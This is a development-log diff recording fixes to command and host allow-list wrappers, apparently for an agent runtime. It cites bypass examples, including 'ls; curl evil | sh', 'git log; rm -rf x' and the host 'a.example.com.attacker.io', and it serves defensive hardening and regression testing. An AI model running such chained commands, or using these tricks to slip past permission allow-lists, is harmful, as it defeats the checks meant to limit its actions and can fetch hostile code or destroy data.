@@ -197,6 +197,17 @@
 > passes in isolation — infer workstream's in-flight tree, untouched here); capi 46/46; no ABI
 > growth. test/ battery is gitignored (never committed) — the committed coverage for this
 > phase is the existing capi agent contract + these in-battery checks.
+> **Review-hardening addendum (same phase, pre-push OpenQodex gate):** the mandatory review
+> receipt returned 2 majors, both true positives in THIS stream's wrappers, both fixed before
+> push: (1) `hostAllowed` wildcard `*.example.com` used indexOf-anywhere —
+> `a.example.com.attacker.io` passed; now SUFFIX-anchored (host ends with the suffix or is the
+> bare domain). (2) whole-string shell judging let chains through ('ls; curl evil | sh' passed
+> readonly's 'ls'; 'git log; rm -rf x' passed patterns ['git *']) — commands are now split on
+> `; && || | & >` + newline, command substitution (`$(`, `${`, backtick, `<(`) is refused
+> outright, and EVERY segment must match the allow-list; redirection therefore refuses in
+> patterns mode too (a redirect target is not a command and the write was never granted).
+> Battery now pins all three bypasses as checks (shella tc2 'git log; rm —', roshell tc2
+> 'ls; rm —', netw2 '*.example.com' vs 'a.example.com.attacker.io').
 >
 > **2026-10-14 — Pi 5: attention + RoPE prefill wave — Qwen 128 → 158 t/s (0.89× llama.cpp), Llama-1B 2.28×.**
 > Profiling split the remaining Qwen prefill deficit: attn bucket 246 ms/prompt and `other`
